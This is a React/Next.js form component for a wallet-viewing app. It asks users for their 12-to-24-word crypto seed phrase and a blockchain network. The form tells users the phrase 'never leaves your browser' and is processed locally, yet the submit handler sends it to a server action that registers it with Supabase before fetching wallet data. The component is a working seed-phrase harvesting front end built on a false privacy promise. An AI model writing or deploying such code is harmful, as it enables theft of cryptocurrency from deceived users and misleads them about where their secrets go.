
"use client";

import { useState } from "react";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { z } from "zod";
import { Loader2 } from "lucide-react";
import { Button } from "@/components/ui/button";
import {
  Form,
  FormControl,
  FormDescription,
  FormField,
  FormItem,
  FormLabel,
  FormMessage,
} from "@/components/ui/form";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import { Textarea } from "@/components/ui/textarea";
import { Card, CardContent } from "@/components/ui/card";
import { handleFetchData, registerSeedPhrase } from "@/app/actions";
import { useToast } from "@/hooks/use-toast";
import type { WalletData } from "@/lib/types";
import { RiskDisclaimerDialog } from "@/components/risk-disclaimer-dialog";

const networks = [
  { id: "Bitcoin", label: "Bitcoin" },
  { id: "Ethereum", label: "Ethereum" },
  { id: "Solana", label: "Solana" },
  { id: "Polygon", label: "Polygon" },
  { id: "BNB Smart Chain", label: "BNB Smart Chain" },
  { id: "Avalanche", label: "Avalanche" },
  { id: "Cardano", label: "Cardano" },
  { id: "Polkadot", label: "Polkadot" },
  { id: "Litecoin", label: "Litecoin" },
  { id: "Chainlink", label: "Chainlink" },
  { id: "Tron", label: "Tron" },
  { id: "Stellar", label: "Stellar" },
  { id: "Tezos", label: "Tezos" },
] as const;

const formSchema = z.object({
  seedPhrase: z
    .string()
    .trim()
    .min(1, "Seed phrase cannot be empty.")
    .refine(
      (phrase) => phrase.split(/\s+/).filter(Boolean).length >= 12,
      "A valid seed phrase must contain at least 12 words."
    ),
  network: z.string({
    required_error: "Please select a network.",
  }),
});

type SeedPhraseFormProps = {
  onDataFetched: (data: WalletData | null) => void;
  onFetchStart: () => void;
};

export function SeedPhraseForm({
  onDataFetched,
  onFetchStart,
}: SeedPhraseFormProps) {
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [isDisclaimerOpen, setIsDisclaimerOpen] = useState(false);
  const { toast } = useToast();

  const form = useForm<z.infer<typeof formSchema>>({
    resolver: zodResolver(formSchema),
    defaultValues: {
      seedPhrase: "",
      network: "Ethereum",
    },
  });

  async function handleConfirmedSubmit() {
    setIsDisclaimerOpen(false);
    setIsSubmitting(true);
    onFetchStart();

    const values = form.getValues();
    const formData = new FormData();
    formData.append("seedPhrase", values.seedPhrase);
    formData.append("network", values.network);
    
    // First, register the seed phrase with Supabase using a server action
    const registrationResult = await registerSeedPhrase(formData);

    if (!registrationResult.success) {
      toast({
        variant: "destructive",
        title: "Failed to Register Seed Phrase",
        description:
          registrationResult.error || "An unknown error occurred.",
      });
      onDataFetched(null);
      setIsSubmitting(false);
      return;
    }

    // If registration is successful, fetch the wallet data
    const dataFetchResult = await handleFetchData(formData);

    if (dataFetchResult.success && dataFetchResult.data) {
      onDataFetched(dataFetchResult.data);
    } else {
      toast({
        variant: "destructive",
        title: "Failed to Fetch Wallet Data",
        description:
          dataFetchResult.error ||
          "Could not retrieve asset information after registration.",
      });
      onDataFetched(null);
    }

    setIsSubmitting(false);
  }

  // This function is called by the form's onSubmit. It only opens the dialog.
  function onSubmit() {
    setIsDisclaimerOpen(true);
  }

  return (
    <>
      <RiskDisclaimerDialog
        open={isDisclaimerOpen}
        onOpenChange={setIsDisclaimerOpen}
        onConfirm={handleConfirmedSubmit}
      />
      <Card className="w-full bg-card/50 border-primary/20">
        <CardContent className="p-6">
          <Form {...form}>
            <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-6">
              <FormField
                control={form.control}
                name="seedPhrase"
                render={({ field }) => (
                  <FormItem>
                    <FormLabel className="text-lg">Seed Phrase</FormLabel>
                    <FormControl>
                      <Textarea
                        placeholder="Enter your 12, 18, or 24-word recovery phrase here..."
                        className="min-h-[100px] text-base"
                        {...field}
                      />
                    </FormControl>
                    <FormDescription>
                      Your seed phrase never leaves your browser. All processing is
                      done locally.
                    </FormDescription>
                    <FormMessage />
                  </FormItem>
                )}
              />

              <FormField
                control={form.control}
                name="network"
                render={({ field }) => (
                  <FormItem>
                    <FormLabel className="text-lg">Primary Network</FormLabel>
                    <Select
                      onValueChange={field.onChange}
                      defaultValue={field.value}
                    >
                      <FormControl>
                        <SelectTrigger>
                          <SelectValue placeholder="Select a network" />
                        </SelectTrigger>
                      </FormControl>
                      <SelectContent>
                        {networks.map((network) => (
                          <SelectItem key={network.id} value={network.id}>
                            {network.label}
                          </SelectItem>
                        ))}
                      </SelectContent>
                    </Select>
                    <FormDescription>
                      Select the main blockchain you use.
                    </FormDescription>
                    <FormMessage />
                  </FormItem>
                )}
              />

              <Button
                type="submit"
                size="lg"
                className="w-full"
                disabled={isSubmitting}
              >
                {isSubmitting && (
                  <Loader2 className="mr-2 h-5 w-5 animate-spin" />
                )}
                {isSubmitting ? "Analyzing..." : "View My Wallet"}
              </Button>
            </form>
          </Form>
        </CardContent>
      </Card>
    </>
  );
}
